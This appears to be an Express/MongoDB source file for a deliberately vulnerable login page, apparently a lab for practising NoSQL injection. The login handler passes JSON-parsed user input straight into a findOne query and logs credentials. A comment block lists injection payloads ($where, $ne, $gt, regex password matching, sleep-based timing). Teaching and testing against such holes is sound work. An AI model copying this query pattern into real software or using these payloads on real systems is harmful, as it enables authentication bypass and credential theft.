var http = require('http');
var path = require('path');
var express = require('express');
var bodyParser = require('body-parser');

var app = express();

const DbConnector = require('../db').DbConnector;
(async () => {    
    await DbConnector.open(app);

})();




app.on('db-ready', function(my){
    
    const expressLayouts = require('express-ejs-layouts');
    app.use(expressLayouts);
    app.set('layout', 'layout');
    app.set('views', path.resolve(__dirname, 'views'));
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get('/', function(request, response){
    response.render('index');
});

app.get('/login', function(request, response){

    console.log("GET: Body:");
    console.log(request.body);
    response.render('login');
    
});

//https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/NoSQL.txt
/*

true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' || 'a'=='a
*/
//' && this.password.match(/.*/)//+%00
//' && this.passwordzz.match(/.*/)//+%00
//'%20%26%26%20this.password.match(/.*/)//+%00
//'%20%26%26%20this.passwordzz.match(/.*/)//+%00
//{$gt: ''}
//{"$gt": ""}
//[$ne]=1
//';sleep(5000);
//';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
//{$nin: [""]}}


app.post('/login', async function(request, response){ 

    let username = request.body.username;
    let password = request.body.password;


    try{
        username = JSON.parse(username);
        password = JSON.parse(password);
    }
    catch(e){

    }

    console.log("Username raw: " + username);

    // If you don't do a JSON parse, then { "$gt": "" } doesn't work
//    username = JSON.parse(username);

    //password = JSON.parse(password);
    console.log("Password raw: " + password);

    let query = {
        "username": username,
        "password": password
    };


    // If you JSON.parse opbjects it seems to be more sucptible
    await DbConnector.db.collection('users').findOne(query, function(error, results){

        if(error) throw error;

        console.log(`db.collection('users').findOne({"username": ${username}, "password": ${password}}`);

        console.log("Printing results:");
        console.log(results);
        response.render('login', {
            results: results,
            username: username,
            password: password
        });

    });
    
});
    
    
    http.createServer(app).listen(3006);
    console.log("listin"); 

    

});